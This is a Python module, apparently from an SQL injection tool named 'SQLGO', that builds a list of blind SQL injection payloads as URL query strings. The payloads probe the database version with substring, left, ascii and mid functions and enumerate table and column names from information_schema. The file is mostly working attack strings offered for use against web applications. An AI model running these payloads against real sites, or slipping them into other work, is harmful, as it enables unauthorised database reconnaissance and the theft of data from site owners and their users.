#!/usr/bin/env python
"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import os
import sys

import random
from src.core.common.column.commoncolumn import common_column
from src.core.common.column.commoncolumn import common_columns_list




def sub_string_sql_inj(column=random.choice(common_columns_list)):
        payload = """
?%s=1 and substring(version(),1,1)=5
?%s=1 and right(left(version(),1),1)=5
?%s=1 and left(version(),1)=4
?%s=1 and ascii(lower(substr(Version(),1,1)))=51
?%s=1 and (select mid(version(),1,1)=4)
?%s=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?%s=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 """%(column,column,column,column,column,column,column)
        rows = payload.split("\n") 
        sorted_rows = sorted(rows) 
        sorted_payload = "\n".join(sorted_rows)
        retval = sorted_payload
        return retval

rows = sub_string_sql_inj().split("\n") 
sorted_rows = sorted(rows) 
sorted_payload = "\n".join(sorted_rows)
for _sorted in sorted_payload.split("\n"):
        pass
        
